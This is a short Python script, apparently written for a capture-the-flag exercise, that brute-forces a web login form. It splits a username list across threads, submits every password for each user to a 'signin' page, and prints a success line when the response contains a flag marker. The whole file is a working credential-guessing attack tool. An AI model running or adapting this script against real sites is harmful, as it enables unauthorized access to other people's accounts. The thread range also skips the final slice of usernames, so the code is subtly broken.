import requests
import threading
from data import header, URL, usernames, passwords, CORE_NB

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
RESET = "\033[0m"
BOLD = "\033[1m"

def printHeader():
    print(f"{CYAN}{BOLD}{header}{RESET}")


def bruteForce(thread, cores):
    try:
        start_user: int = int(len(usernames) * ((thread - 1) / cores))
        end_user: int = int(len(usernames) * (thread / cores))
        print()
        for user in usernames[start_user: end_user]:
            for password in passwords:
                res = requests.get(
                    url=URL,
                    params={
                        "page": "signin",
                        "username": user,
                        "password": password,
                        "Login": "Login",
                    },
                )
                if res.text.find("The flag is :") != -1:
                    print(f"{GREEN}Success: {user} {password}{RESET}")
                else:
                    print(f"{YELLOW}Attempted: {user} {password}{RESET}")
    except KeyboardInterrupt:
        print(f"{RED}Process interrupted by user (KeyboardInterrupt).{RESET}")

def main():
    printHeader()
    threads = []
    for number in range(1, CORE_NB):
        thread = threading.Thread(target=bruteForce, args=(number, CORE_NB))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()

